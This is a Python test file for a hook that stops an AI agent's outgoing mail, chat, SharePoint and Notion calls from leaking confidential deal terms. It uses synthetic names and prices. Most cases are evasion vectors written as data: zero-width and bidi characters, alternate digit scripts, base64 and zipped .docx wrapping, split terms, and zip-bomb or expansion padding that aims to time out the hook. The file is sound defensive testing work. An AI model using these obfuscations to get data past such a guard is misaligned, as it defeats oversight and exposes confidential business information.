# Real Office files are DEFLATED, so the XML is not readable in the raw bytes -- only unpacking the
# container finds the term (the STORED case above would pass on raw bytes alone).
_zdef = io.BytesIO()
with zipfile.ZipFile(_zdef, "w", zipfile.ZIP_DEFLATED) as _z:
    _z.writestr("word/document.xml", "<w:document><w:p><w:r><w:t>%s</w:t></w:r></w:p></w:document>" % A1)
expect("DEFLATED .docx really hides the term from a raw-bytes scan (fixture sanity)", 0,
       int(A1.lower().encode("utf-8") in _zdef.getvalue().lower()))
expect("BLOCK sharepoint_upload_file: DEFLATED .docx carrying the term", 2,
       *run({"tool_name": M365 + "sharepoint_upload_file", "tool_input": {
           "driveId": "b!x", "filename": "memo.docx",
           "contentBase64": base64.b64encode(_zdef.getvalue()).decode("ascii")}}))
_zclean = io.BytesIO()
with zipfile.ZipFile(_zclean, "w") as _z:
    _z.writestr("word/document.xml", "<w:document><w:t>Columbus flex portfolio</w:t></w:document>")
expect("ALLOW sharepoint_update_file: clean .docx", 0, *run({"tool_name": M365 + "sharepoint_update_file",
       "tool_input": {"driveId": "b!x", "itemId": "01AB",
                      "contentBase64": base64.b64encode(_zclean.getvalue()).decode("ascii")}}))
expect("BLOCK sharepoint_upload_file: contentBase64 that is not base64 (cannot be read)", 2,
       *run({"tool_name": M365 + "sharepoint_upload_file", "tool_input": {
           "driveId": "b!x", "filename": "a.bin", "contentBase64": "%%% not base64 %%%"}}))
# The legacy Composio names stay covered exactly as before.
expect("BLOCK legacy OUTLOOK_SEND_EMAIL still scanned", 2,
       *run(outlook_payload(OUTLOOK, "FYI: " + A1)))
# Base64 as senders actually produce it (review finding 2026-09-30): wrapped, URL-safe, data: URI,
# unpadded. Each carries the term and must block; flag-like keys that merely mention base64 are not
# content and must not be decoded (they used to fail closed on every call).
_b = base64.b64encode(("Memo: %s closing ~~??>>" % A1).encode("utf-8")).decode("ascii")
_b64_forms = [
    ("line-wrapped", "\r\n".join(_b[i:i + 20] for i in range(0, len(_b), 20))),
    ("URL-safe", base64.urlsafe_b64encode(("Memo: %s closing ~~??>>" % A1).encode("utf-8")).decode("ascii")),
    ("data: URI", "data:text/plain;base64," + _b),
    ("unpadded", _b.rstrip("=")),
]
for _lbl, _val in _b64_forms:
    expect("BLOCK sharepoint_upload_file: term in %s contentBase64" % _lbl, 2,
           *run({"tool_name": M365 + "sharepoint_upload_file", "tool_input": {
               "driveId": "b!x", "filename": "m.txt", "contentBase64": _val}}))
# The clean counterparts must ALLOW -- otherwise the cases above would pass on a guard that simply
# fails closed on every non-strict encoding.
_c = "Columbus flex portfolio update ~~??>> " * 3
_cb = base64.b64encode(_c.encode("utf-8")).decode("ascii")
for _lbl, _val in [("line-wrapped", "\r\n".join(_cb[i:i + 20] for i in range(0, len(_cb), 20))),
                   ("URL-safe", base64.urlsafe_b64encode(_c.encode("utf-8")).decode("ascii")),
                   ("data: URI", "data:text/plain;base64," + _cb),
                   ("unpadded", base64.b64encode((_c + "x").encode("utf-8")).decode("ascii").rstrip("="))]:
    expect("ALLOW sharepoint_upload_file: clean %s contentBase64" % _lbl, 0,
           *run({"tool_name": M365 + "sharepoint_upload_file", "tool_input": {
               "driveId": "b!x", "filename": "m.txt", "contentBase64": _val}}))
expect("ALLOW Outlook draft whose flag fields merely mention base64 (not content)", 0,
       *run({"tool_name": M365 + "outlook_create_draft", "tool_input": {
           "to": ["b@example.com"], "subject": "Update", "body": "Columbus flex update",
           "isBase64": "false", "useBase64": "yes"}}))
expect("ALLOW Graph-style attachment contentBytes, clean", 0,
       *run({"tool_name": M365 + "outlook_create_draft", "tool_input": {
           "to": ["b@example.com"], "subject": "Update", "body": "see attached",
           "attachments": [{"name": "a.txt", "contentBytes": base64.b64encode(b"clean text").decode()}]}}))
expect("BLOCK Graph-style attachment contentBytes carrying the term", 2,
       *run({"tool_name": M365 + "outlook_create_draft", "tool_input": {
           "to": ["b@example.com"], "subject": "Update", "body": "see attached",
           "attachments": [{"name": "a.txt", "contentBytes": base64.b64encode(A1.encode("utf-8")).decode()}]}}))
# Rendering: &nbsp; is a space to the reader; so is a whitespace run between block tags.
if " " in A1:
    expect("BLOCK teams message: a space in the term written as &nbsp;", 2,
           *run({"tool_name": M365 + "teams_send_chat_message", "tool_input": {
               "chatId": "19:a@thread.v2", "bodyType": "html", "body": A1.replace(" ", "&nbsp;", 1)}}))
    _sp = A1.index(" ")
    expect("BLOCK outlook_send_mail: term split across two block tags with a newline between", 2,
           *run({"tool_name": M365 + "outlook_send_mail", "tool_input": {
               "to": ["b@example.com"], "subject": "Update", "bodyType": "html",
               "body": "<div>%s</div>\n   <div>%s</div>" % (A1[:_sp], A1[_sp + 1:])}}))
_zpp = io.BytesIO()
with zipfile.ZipFile(_zpp, "w") as _z:
    _z.writestr("word/document.xml", "<w:document>\n  <w:r>\n    <w:t>%s</w:t>\n  </w:r>\n  <w:r>\n"
                "    <w:t>%s</w:t>\n  </w:r>\n</w:document>" % (A1[:_mid], A1[_mid:]))
expect("BLOCK sharepoint_update_file: pretty-printed .docx XML splitting the term mid-word", 2,
       *run({"tool_name": M365 + "sharepoint_update_file", "tool_input": {
           "driveId": "b!x", "itemId": "01AB", "contentBase64": base64.b64encode(_zpp.getvalue()).decode()}}))
# Aggregate decode cap: several individually-small bombs must block, not run the hook into the
# harness timeout (a timed-out hook does not block).
_bomb = io.BytesIO()
with zipfile.ZipFile(_bomb, "w", zipfile.ZIP_DEFLATED) as _z:
    _z.writestr("x.xml", b"\0" * (12 * 1024 * 1024))
_bomb_b64 = base64.b64encode(_bomb.getvalue()).decode()
expect("BLOCK three 12MB-decompressing zips in one call (aggregate decode cap)", 2,
       *run({"tool_name": M365 + "outlook_create_draft", "tool_input": {
           "to": ["b@example.com"], "subject": "x", "body": "x",
           "attachments": [{"name": "a%d.docx" % i, "contentBytes": _bomb_b64} for i in range(3)]}}))
expect("ALLOW one 12MB-decompressing clean zip (under the cap)", 0,
       *run({"tool_name": M365 + "sharepoint_update_file", "tool_input": {
           "driveId": "b!x", "itemId": "01AB", "contentBase64": _bomb_b64}}))

# --- settings.json matcher vs guard classification (2026-09-30) --------------------------------
# A guard that classifies a tool is only as good as the PreToolUse matcher that routes that tool
# to it. Claude Code matcher semantics are assumed to be the STRICTEST plausible reading:
# ^(?:matcher)$, case-sensitive. A tool that passes under that reading also passes under an
# unanchored or case-insensitive one, so the assumption can only over-report a gap, never hide one.
OLD_LIVE_MATCHER = ("NotebookEdit|mcp__.*notion-(create|update|append|duplicate|move|comment)|"
                    "mcp__.*OUTLOOK_(SEND|CREATE_DRAFT|SEND_DRAFT|FORWARD|REPLY)")
# One "mcp__.*<pattern>.*" alternative per guard pattern (MATCHER CONTRACT in the guard), plus
# the Composio-era uppercase Outlook alternative kept from the old string.
PROPOSED_MATCHER = (
    "NotebookEdit"
    "|mcp__.*OUTLOOK_(SEND|CREATE_DRAFT|SEND_DRAFT|FORWARD|REPLY).*"
    "|mcp__.*notion[-_]?(create|update|append|duplicate|move|comment).*"
    "|mcp__.*outlook_(send|create_draft|send_draft|forward|reply).*"
    "|mcp__.*outlook_(send_mail|send_draft|forward_mail|create_draft|create_reply_draft|"
    "create_reply_all_draft|update_draft|set_vacation).*"
    "|mcp__.*outlook_(create_event|update_event|respond_to_event|delete_event).*"
    "|mcp__.*teams_(send_chat_message|send_channel_message|reply_channel_message|create_chat).*"
    "|mcp__.*sharepoint_(upload_file|update_file).*"
    "|mcp__.*__manage_(crm_objects|blog_post|landing_page|website_page|campaign_objects|segment|"
    "aeo_prompts|social_posts).*"
    "|mcp__.*notion-(send-message-to-session|spawn-session).*"
)
NOTION_LIVE = "mcp__c5f4869f-7d3a-4472-a66a-8e61315feb51__"
_CLASSIFY_UNIVERSE = sorted(set(SEND_TOOLS) | set(READ_ONLY_TOOLS) | {
    OUTLOOK, OUTLOOK_DRAFT, NOTION, NOTION_UPD,
    NOTION_LIVE + "notion-create-comment", NOTION_LIVE + "notion-move-pages",
    NOTION_LIVE + "notion-duplicate-page", NOTION_LIVE + "notion-update-data-source",
    NOTION_LIVE + "notion-fetch", NOTION_LIVE + "notion-search",
    M365 + "outlook_create_filter", M365 + "outlook_create_label", M365 + "outlook_trash_thread",
    M365 + "sharepoint_rename_item", M365 + "sharepoint_create_folder", M365 + "sharepoint_move_item",
})


def _full(matcher, name):
    return re.fullmatch("(?:%s)" % matcher, name) is not None


_classify = getattr(_guard_mod, "classify_tool", lambda _t: None)
# DERIVED FROM THE GUARD, not from a hand list (review finding 2026-09-30: a fixed list let a new
# guard branch go unrouted with the suite green). (1) Every guard pattern appears verbatim as a
# matcher alternative. (2) Tool names are generated from each pattern's own alternatives, with a
# server prefix and suffix drift, and every generated name the guard classifies must be routed.
_surfaces = getattr(_guard_mod, "MCP_SEND_SURFACES", ())
expect_eq("guard exposes MCP_SEND_SURFACES", True, len(_surfaces) >= 8)
for _rx, _lbl in _surfaces:
    expect_eq("matcher carries the guard pattern %r verbatim" % _rx.pattern, True,
              ("mcp__.*%s.*" % _rx.pattern) in PROPOSED_MATCHER)
_generated = []
for _rx, _lbl in _surfaces:
    _m = re.fullmatch(r"(?P<pre>.*?)\((?P<alts>[^()]*)\)", _rx.pattern)
    expect_eq("guard pattern %r has the prefix(alt|alt) shape the generator expects" % _rx.pattern,
              True, _m is not None)
    if not _m:
        continue
    _pres = [_m.group("pre").replace("[-_]?", s) for s in ("-", "_", "")] \
        if "[-_]?" in _m.group("pre") else [_m.group("pre")]
    for _pre in _pres:
        for _alt in _m.group("alts").split("|"):
            for _suffix in ("", "-pages", "_v2"):
                # A pattern anchored on "__" (HubSpot) supplies that separator itself.
                _generated.append("mcp__srv9" + ("" if _pre.startswith("__") else "__") + _pre + _alt + _suffix)
                if _rx.flags & re.I and _pre.startswith("outlook_"):
                    _generated.append("mcp__srv9__" + (_pre + _alt + _suffix).upper())
for t in _generated:
    expect_eq("generated %s is classified by the guard" % t, True, bool(_classify(t)))
    expect_eq("generated %s is routed by the proposed matcher (anchored)" % t, True, _full(PROPOSED_MATCHER, t))
_classified = [t for t in _CLASSIFY_UNIVERSE if _classify(t)]
for t in _classified:
    expect_eq("proposed matcher routes classified send surface %s" % t.rsplit("__", 1)[1], True,
           _full(PROPOSED_MATCHER, t))
for t in READ_ONLY_TOOLS:
    expect_eq("proposed matcher does not route read-only %s" % t.rsplit("__", 1)[1], False,
           _full(PROPOSED_MATCHER, t))
# Demo (and regression pin): the pre-2026-09-30 live matcher routes NONE of the live lowercase
# tools, under the documented reading (JS RegExp.test: unanchored, case-sensitive) as well as the
# anchored one. (hooks.md: a matcher with regex characters is "JavaScript regular expression,
# unanchored"; case sensitivity is not stated -- JS default is case-sensitive.)
def _search(matcher, name):
    return re.search(matcher, name) is not None


expect_eq("OLD live matcher misses outlook_send_mail (anchored reading)", False,
          _full(OLD_LIVE_MATCHER, M365 + "outlook_send_mail"))
expect_eq("OLD live matcher misses outlook_send_mail (documented unanchored reading)", False,
          _search(OLD_LIVE_MATCHER, M365 + "outlook_send_mail"))
for t in _classified:
    expect_eq("proposed matcher routes %s under the unanchored reading too" % t.rsplit("__", 1)[1], True,
              _search(PROPOSED_MATCHER, t))
_md = os.path.join(os.path.dirname(HOOK_DIR), "_proposed", "confguard-matcher.md")
if os.path.exists(_md):  # _proposed/ is gitignored: checked when present, never required
    with open(_md, encoding="utf-8") as f:
        _m = re.search(r"<!-- new-matcher -->\s*```[a-z]*\n(.+?)\n```", f.read(), re.S)
    expect_eq("_proposed/confguard-matcher.md carries exactly PROPOSED_MATCHER", PROPOSED_MATCHER,
           _m.group(1).strip() if _m else None)
# The repo's own settings.json (matcher applied 2026-10-01): its confidentiality-guard entry must be
# exactly PROPOSED_MATCHER, and must route every classified send surface.
_settings = os.path.join(os.path.dirname(HOOK_DIR), "settings.json")
try:
    with open(_settings, encoding="utf-8") as f:
        _entries = json.load(f).get("hooks", {}).get("PreToolUse", [])
    _live = [e.get("matcher", "") for e in _entries
             if any("confidentiality-guard.py" in (h.get("command") or "") for h in e.get("hooks", []))
             and e.get("matcher", "") != "Edit|Write|MultiEdit"]
except Exception:
    _live = None
if _live:
    expect_eq("settings.json confidentiality-guard matcher is exactly PROPOSED_MATCHER", [PROPOSED_MATCHER], _live)
    _gaps = [t for t in _classified if not any(_full(m, t) for m in _live)]
    expect_eq("settings.json confidentiality-guard matcher routes every classified send surface "
              "(gaps: %s)" % ", ".join(t.rsplit("__", 1)[1] for t in _gaps), [], _gaps)

# --- Matching normalization (2026-10-13; refute wf_d42a89c6-fe5 on PR #457) -------------------------
# Mirror of the vectors in oxford-command-center/tests/unit/confidential.test.ts -- keep in step.
# SYNTHETIC roster only. Built with chr() so this file never carries an invisible literal.
_G = _load_guard_module()
ZWSP, ZWNJ, ZWJ, WJ, SHY, BOM, LRM = (chr(c) for c in (0x200B, 0x200C, 0x200D, 0x2060, 0x00AD, 0xFEFF, 0x200E))
NBSP, THIN, NNBSP, IDEO = (chr(c) for c in (0x00A0, 0x2009, 0x202F, 0x3000))
CURLY, ENDASH, EMDASH, ACUTE, MODAPOS, MINUS, CLL = (
    chr(c) for c in (0x2019, 0x2013, 0x2014, 0x00B4, 0x02BC, 0x2212, 0x0332))
_NAME, _PLAZA, _PRICE = "Zephyrine Holdings", "O'Malley-Brandt Plaza", "4250000"
_NT = {
    "_meta": {"note": "synthetic"},
    "deal-n": {"label": "Deal N", "active": True, "always": [_NAME, _PLAZA, _PRICE],
               "context": ["harbor point"], "context_requires_any": ["project quill"]},
}


def nhit(text, terms=_NT):
    h = _G.find_hit(text, terms)
    return h[0] if h else None


_obf = {
    "zwsp mid-word": "Zeph" + ZWSP + "yrine Holdings",
    "zwnj": "Zephyrine Hold" + ZWNJ + "ings",
    "zwj": "Z" + ZWJ + "ephyrine Holdings",
    "word joiner": "Zephyrine" + WJ + " Holdings",
    "soft hyphen": "Zephy" + SHY + "rine Holdings",
    "bom": BOM + "Zephyrine Holdings",
    "lrm": "Zephyrine" + LRM + " Holdings",
    "zwsp as separator": "Zephyrine" + ZWSP + "Holdings",
    "zwsp padded separator": "Zephyrine" + ZWSP + " " + ZWSP + "Holdings",
    "combining low line": "Zeph" + CLL + "yrine Holdings",
    "nbsp": "Zephyrine" + NBSP + "Holdings",
    "thin space": "Zephyrine" + THIN + "Holdings",
    "narrow nbsp": "Zephyrine" + NNBSP + "Holdings",
    "ideographic space": "Zephyrine" + IDEO + "Holdings",
    "tab/newline/run": "Zephyrine\t\n   Holdings",
    "fullwidth": "".join(chr(ord(c) + 0xFEE0) if c != " " else " " for c in _NAME),
    "math bold Z": chr(0x1D419) + "ephyrine Holdings",
    "mixed case": "zEPHYRINE hOLDINGS",
    "60x zwsp padding": (ZWSP * 60).join(_NAME),
    "curly apostrophe + en dash": "O" + CURLY + "Malley" + ENDASH + "Brandt Plaza",
    "acute + em dash + nbsp": "O" + ACUTE + "Malley" + EMDASH + "Brandt" + NBSP + "Plaza",
    "modifier apostrophe + minus": "O" + MODAPOS + "Malley" + MINUS + "Brandt Plaza",
}
for _lbl, _txt in _obf.items():
    expect_eq("normalization: %s is caught" % _lbl, "Deal N", nhit(_txt))
    expect_eq("normalization: %s is caught when nested in a payload" % _lbl, "Deal N",
              nhit(_G.collect_text({"a": [{"t": "Re: " + _txt + " - update"}]})))

for _lbl, _txt in {
    "plain": "4250000", "US commas": "$4,250,000", "de-DE dots": "4.250.000", "spaces": "4 250 000",
    "nbsp groups": "4" + NBSP + "250" + NBSP + "000", "nnbsp groups": "4" + NNBSP + "250" + NNBSP + "000",
    "curly-apostrophe groups": "4" + CURLY + "250" + CURLY + "000", "underscores": "4_250_000",
    "zwsp inside number": "4,250," + ZWSP + "000", "sentence": "Purchase price of $4,250,000 (all cash).",
}.items():
    expect_eq("normalization: numeric term vs %s" % _lbl, "Deal N", nhit(_txt))

_np = {"deal-p": {"label": "Deal P", "active": True, "always": ["$1,875,000"]}}
expect_eq("normalization: roster term with separators matches the bare number", "Deal P", nhit("closing at 1875000", _np))
expect_eq("normalization: roster term with separators matches dotted groups", "Deal P", nhit("at 1.875.000", _np))
_nq = {"deal-q": {"label": "Deal Q", "active": True, "always": ["250000"]}}
for _txt in ("$4,250,000", "$2,500,000", "$1,250,000 and $250,001"):
    expect_eq("normalization: numeric term 250000 is not found inside %r" % _txt, None, nhit(_txt, _nq))
expect_eq("normalization: numeric term 250000 matches $250,000", "Deal Q", nhit("$250,000", _nq))

_nr = {"deal-m": {"label": "Deal M", "active": True,
                  "always": ["Quillon" + NBSP + "Yard", "St" + CURLY + "s Landing", "Ｖesper Gate"]}}
for _txt in ("the quillon yard lease", "st's landing", "Vesper Gate parcel"):
    expect_eq("normalization: roster-side folding for %r" % _txt, "Deal M", nhit(_txt, _nr))

for _txt in (
    "A zephyr is a gentle breeze; Holdings Inc. reported earnings.", "Holdings Zephyrine",
    "The plaza on O" + CURLY + "Malley Street and the Brandt building",
    "$14,250,000 and $42,500,000 and $4,250 per month",
    "Rent is $12.50 per SF NNN; 1,234.56 sq ft; suite 4 100",
    "Café Müller naïve résumé - Columbus, Ohio - industrial/flex 4,250 SF",
    "Call 614-555-0142 or 513.555.0199 on 2026-10-13", "Occupancy 94.2%, WALT 3.7 yrs, DSCR 1.31x, LTV 38%",
    "", ZWSP + NBSP + BOM, "Zephyrine" + ZWSP + ZWSP + "Properties", "Holdings" + ZWSP + "Zephyrine",
):
    expect_eq("normalization: no false positive on %r" % _txt[:40], None, nhit(_txt))

expect_eq("normalization: obfuscated anchor + context term hits", "Deal N",
          nhit("proj" + ZWSP + "ect" + NBSP + "quill: harbor" + THIN + "point"))
expect_eq("normalization: context term alone stays clean", None, nhit("harbor" + NBSP + "po" + ZWSP + "int"))
expect_eq("normalization: inactive deal stays skipped", None,
          nhit("Inert" + ZWSP + " Name", {"deal-off": {"label": "Off", "active": False, "always": ["Inert Name"]}}))
expect_eq("normalization: malformed roster entries are skipped, not raised", None,
          nhit("anything", {"d": {"label": "x", "always": [5, None, ["y"]], "context_requires_any": [3]}}))

# Canonical forms -- identical expectation to the normalizeForScan test in confidential.test.ts.
expect_eq("normalization: canonical forms", (("zephyrineholdings $4,250,000", "zephyrine holdings $4,250,000"),
                                              ("zephyrineholdings $4250000", "zephyrine holdings $4250000"),
                                              ("zephyrineholdings$4,250,000",)),
          _G._norm_variants("Zephyrine" + ZWSP + "Holdings  $4,250,000"))

# End to end through the real hook process: an obfuscated term must block on an egress surface.
_nfd, _npath = tempfile.mkstemp(prefix="synthetic-norm-terms-", suffix=".json")
with os.fdopen(_nfd, "w", encoding="utf-8") as _f:
    json.dump(_NT, _f)
atexit.register(lambda: os.path.exists(_npath) and os.remove(_npath))


def run_norm(payload_obj):
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_npath)
    p = subprocess.run([sys.executable, GUARD], input=json.dumps(payload_obj), capture_output=True,
                       text=True, encoding="utf-8", env=env, timeout=60)
    return p.returncode, p.stderr


for _lbl in ("zwsp mid-word", "nbsp", "zwsp as separator", "fullwidth", "curly apostrophe + en dash"):
    _c, _e = run_norm(notion_payload(NOTION, _obf[_lbl]))
    expect("normalization e2e: Notion write with %s blocks" % _lbl, 2, _c, _e)
_c, _e = run_norm(notion_payload(NOTION, "Price is $4,250,000 per the term sheet"))
expect("normalization e2e: Notion write with a formatted price blocks", 2, _c, _e)
_c, _e = run_norm(notion_payload(NOTION, "Columbus industrial update, $14,250,000 and a zephyr breeze"))
expect("normalization e2e: clean Notion write is allowed", 0, _c, _e)

# Seam: the existing file text carries a term prefix padded with far more zero-width characters than
# any raw-character window would cover; the Edit supplies only the tail. Must still block.
_sd = tempfile.mkdtemp(prefix="norm-seam-")
atexit.register(lambda: __import__("shutil").rmtree(_sd, ignore_errors=True))
_sp = os.path.join(_sd, "website-canonical", "page.html")
os.makedirs(os.path.dirname(_sp))
with open(_sp, "w", encoding="utf-8") as _f:
    _f.write("<p>" + (ZWSP * 400).join("Zephyrine Hol") + ZWSP * 400 + "XX</p>")
_c, _e = run_norm({"tool_name": "Edit", "tool_input": {"file_path": _sp, "old_string": "XX", "new_string": "dings"}})
expect("normalization seam: term completed across a zero-width-padded prefix blocks", 2, _c, _e)
_c, _e = run_norm({"tool_name": "Edit", "tool_input": {"file_path": _sp, "old_string": "XX", "new_string": "zz"}})
expect("normalization seam: a harmless completion of the same page is allowed", 0, _c, _e)

# --- Round-2 vectors (adversarial review of 2026-10-13): invisible/control chars, bidi, accents, dashes,
# digit scripts, superscripts, table pin, seam significance, size budget. Mirrors confidential.test.ts.
TABLES_SHA = "5899947863b6aafde85357d8f0f52f3e81b0c03169edd8d601eea675cad3b149"
expect_eq("normalization: fixed Unicode table hash (must equal the TypeScript twin's)", TABLES_SHA,
          _G.normalization_tables_sha256())

_cc = lambda *cs: "".join(chr(c) for c in cs)
_r2 = {
    "NUL inside the term": "Zephy" + chr(0) + "rine Holdings",
    "SOH / DEL / C1 controls": "Zeph" + _cc(1, 0x7F, 0x80, 0x9F) + "yrine Holdings",
    "unassigned default-ignorable U+2065": "Zephyrine" + chr(0x2065) + " Holdings",
    "unassigned default-ignorable U+FFF0": "Zephyr" + chr(0xFFF0) + "ine Holdings",
    "tag character": "Zephyrine" + chr(0xE0041) + " Holdings",
    "variation selector": "Zephyrine" + chr(0xFE0F) + " Holdings",
    "hangul filler": "Zephyrine" + chr(0x3164) + " Holdings",
    "halfwidth voiced mark": "Zeph" + chr(0xFF9E) + "yrine Holdings",
    "right-to-left override (reversed run)": chr(0x202E) + _NAME[::-1] + chr(0x202C),
    "acute accent on e": "Z\u00e9phyrine Holdings",
    "combining acute after a zero-width space": "Ze" + ZWSP + chr(0x0301) + "phyrine Holdings",
    "diaeresis padding as a separator": "Zephyrine" + chr(0xA8) * 200 + "Holdings",
    "armenian hyphen": "O" + CURLY + "Malley" + chr(0x058A) + "Brandt Plaza",
    "supplemental punctuation dash": "O" + CURLY + "Malley" + chr(0x2E3A) + "Brandt Plaza",
    "price with a footnote superscript": "$4,250,000" + chr(0xB9),
    "price in Arabic-Indic digits": "".join(chr(0x660 + int(d)) for d in "4250000"),
    "price in fullwidth digits": "".join(chr(0xFF10 + int(d)) for d in "4250000"),
}
for _lbl, _txt in _r2.items():
    expect_eq("normalization r2: %s is caught" % _lbl, "Deal N", nhit(_txt))

for _txt in ("Bel\u00e9anger and caf\u00e9 menus", "x" + chr(0xB2) + " area, 12" + chr(0xB3) + " volume",
             "Zephyrine" + chr(0xA8) * 5 + "Properties", "\u202e" + "gnirtsrednu" + "\u202c"):
    expect_eq("normalization r2: no false positive on %r" % _txt[:30], None, nhit(_txt))

# Differential: the per-run fast path must equal the plain whole-string algorithm.
import unicodedata as _ud, random as _random


def _ref_form(s, spaced):
    t = _ud.normalize("NFKD", s.translate(_G._T_PRE)).replace(chr(96), "'").lower()
    t = t.translate(_G._T_SPACED if spaced else _G._T_TIGHT).translate(_G._T_POST)
    return " ".join(t.split())


_rnd = _random.Random(7)
_pool = list("abZ 09,.$'`-") + [chr(c) for c in (
    0x200B, 0xAD, 0xA0, 0x2009, 0x3000, 0x0301, 0x0332, 0x2018, 0x2019, 0x2013, 0xFF21, 0xFF41, 0x1D419,
    0xE9, 0x130, 0xDF, 0x3A3, 0x3C2, 0xFB01, 0x2460, 0x215B, 0x216B, 0x660, 0xB9, 0x202E, 0x1, 0x7F, 0x85, 0xFF40, 0x1FEF, 0xFDFA)]
_bad = 0
for _ in range(3000):
    _s = "".join(_rnd.choice(_pool) for _ in range(_rnd.randint(1, 30)))
    if _G._tight_form(_s) != _ref_form(_s, False) or _G._spaced_form(_s) != _ref_form(_s, True):
        _bad += 1
expect_eq("normalization r2: per-run fast path equals the whole-string reference (3000 random strings)", 0, _bad)

# Seam significance: reviewer repros (halfwidth voiced mark / diaeresis pads normalize AWAY or to space
# but counted as 'significant' in the first cut).
for _lbl, _pad, _head, _old, _new, _want in (
    ("halfwidth mark pad", chr(0xFF9E) * 200, "Zeph", "yrinX Holdings", "yrine Holdings", 2),
    ("diaeresis pad", chr(0xA8) * 200, "Zephyrine", "Hxldings", "Holdings", 2),
    ("zero-width pad", ZWSP * 1000, "Zeph", "yrinX Holdings", "yrine Holdings", 2),
    ("harmless completion", chr(0xFF9E) * 200, "Zeph", "yrinX Holdings", "yrinz Holdings", 0),
):
    _sp2 = os.path.join(_sd, "website-canonical", "pad.html")
    with open(_sp2, "w", encoding="utf-8") as _f:
        _f.write("<p>" + _head + _pad + _old + "</p>")
    _c, _e = run_norm({"tool_name": "Edit", "tool_input": {"file_path": _sp2, "old_string": _old, "new_string": _new}})
    expect("normalization seam r2: %s" % _lbl, _want, _c, _e)

# Size budget: past the non-ASCII budget the hook REFUSES (blocks) rather than risk a silent timeout.
_c, _e = run_norm(notion_payload(NOTION, "\u00e9" * 2100000))
expect("normalization r2: oversized non-ASCII payload blocks (fail closed, not a timeout)", 2, _c, _e)
_c, _e = run_norm(notion_payload(NOTION, "plain ascii " * 300000))
expect("normalization r2: large pure-ASCII payload is still scanned and allowed", 0, _c, _e)

# --- Round-3 (second adversarial review): expansion blow-up, backtick via NFKD, seam ScanTooLarge ---
_FDFA = chr(0xFDFA)
_nbt = {"deal-b": {"label": "Deal B", "active": True, "always": ["O'Brannagh Yard"]}}
for _lbl, _cc2 in (("fullwidth grave U+FF40", 0xFF40), ("greek varia U+1FEF", 0x1FEF), ("ascii backtick", 0x60)):
    expect_eq("normalization r3: apostrophe written as %s is caught" % _lbl, "Deal B",
              (lambda h: h[0] if h else None)(_G.find_hit("the O" + chr(_cc2) + "Brannagh Yard lease", _nbt)))

# Plain terms are caught by the linear pre-pass no matter how much slow-to-normalize padding follows.
for _n in (300000, 990000):
    _c, _e = run_norm(notion_payload(NOTION, _NAME + " " + _FDFA * _n))
    expect("normalization r3: plain term + %d expanding chars blocks (linear pre-pass)" % _n, 2, _c, _e)
# An obfuscated term next to heavy padding must still resolve (hit or fail-closed refusal), inside the
# subprocess timeout -- never a silent timeout.
for _n in (100000, 300000):
    _c, _e = run_norm(notion_payload(NOTION, "Zeph" + ZWSP + "yrine Holdings " + _FDFA * _n))
    expect("normalization r3: obfuscated term + %d expanding chars blocks in bounded time" % _n, 2, _c, _e)
_c, _e = run_norm(notion_payload(NOTION, chr(0xAC01) * 40000))
expect("normalization r3: 150k Hangul syllables (4 scan copies) with no term is allowed in bounded time", 0, _c, _e)

# Seam path: a post-edit file past the non-ASCII budget cannot be scanned -> must BLOCK (exit 2), not crash (exit 1).
_sp3 = os.path.join(_sd, "website-canonical", "big.html")
with open(_sp3, "w", encoding="utf-8") as _f:
    _f.write("<p>X" + chr(0x4E2D) * 1100000 + "</p>")
_c, _e = run_norm({"tool_name": "Edit", "tool_input": {"file_path": _sp3, "old_string": "X", "new_string": "Y"}})
# Since the round-5 fix an over-budget context file no longer refuses the edit: the anchor counts as
# present and the small window is judged on its own. What must hold is "never exit 1" (a crash is a
# silent fail-open); the term-inserted case blocking is asserted in the r6 tests below.
expect("normalization r3: edit of an over-budget page is judged on its window (exit 0), never exit 1", 0, _c, _e)

# --- Round-4 (third adversarial review): combining-mark expansion, and tests that FAIL if the
# pre-pass / chunking / output budget are reverted (deterministic -- call counts, not wall time) ---
import unicodedata as _ud4

_U0344 = chr(0x0344)
# (a) chunking: a long run of the expanding mark is cut into bounded NFKD calls, not one huge call.
_calls = []
_real_norm = _ud4.normalize


def _spy(form, text):
    _calls.append(len(text))
    return _real_norm(form, text)


_G.unicodedata.normalize = _spy
try:
    _G._nfkd_chunked("a" + _U0344 * 6000, [0])
finally:
    _G.unicodedata.normalize = _real_norm
expect_eq("normalization r4: a 6000-mark U+0344 run is NFKD'd in bounded pieces", True,
          len(_calls) >= 3 and max(_calls) <= 2048 + 512)

# (b) output budget: expansion past the budget refuses instead of grinding.
_old_budget = _G._NFKD_OUT_BUDGET
_G._NFKD_OUT_BUDGET = 1000
try:
    _G._tight_form("x" + _FDFA * 100)
    _refused = False
except _G.ScanTooLarge:
    _refused = True
finally:
    _G._NFKD_OUT_BUDGET = _old_budget
expect_eq("normalization r4: NFKD output past the budget raises ScanTooLarge", True, _refused)

# (c) pre-pass: a plain, unobfuscated term is found without ANY normalization.
_real_nv = _G._norm_variants


def _boom(_s):
    raise AssertionError("normalization must not run for a plain-term hit")


_G._norm_variants = _boom
try:
    _plain = nhit("see " + _NAME + " " + _FDFA * 1000)
finally:
    _G._norm_variants = _real_nv
expect_eq("normalization r4: plain term is caught by the linear pre-pass, before normalization", "Deal N", _plain)

# (d) end to end: the reviewer's repro (long expanding-mark run) resolves quickly and blocks.
_pad = "a" + _U0344 * 600000


def run_norm_t(payload_obj, timeout):
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_npath)
    try:
        p = subprocess.run([sys.executable, GUARD], input=json.dumps(payload_obj), capture_output=True,
                           text=True, encoding="utf-8", env=env, timeout=timeout)
    except subprocess.TimeoutExpired:
        return 99, "timed out after %ss" % timeout
    return p.returncode, p.stderr


_c, _e = run_norm_t(notion_payload(NOTION, _NAME + " " + _pad), 20)
expect("normalization r4: plain term + 600k U+0344 blocks fast", 2, _c, _e)
_c, _e = run_norm_t(notion_payload(NOTION, "Zeph" + ZWSP + "yrine Holdings " + _pad), 25)
expect("normalization r4: obfuscated term + 600k U+0344 resolves in bounded time (block)", 2, _c, _e)

# --- Round-5 (fourth adversarial review): wall-clock deadline + many-seam replace_all with context anchors ---
_time = __import__("time")
_G._DEADLINE[0] = _time.monotonic() - 1
try:
    _G.find_hit("anything", _NT)
    _dl = False
except _G.ScanTooLarge:
    _dl = True
finally:
    _G._DEADLINE[0] = None
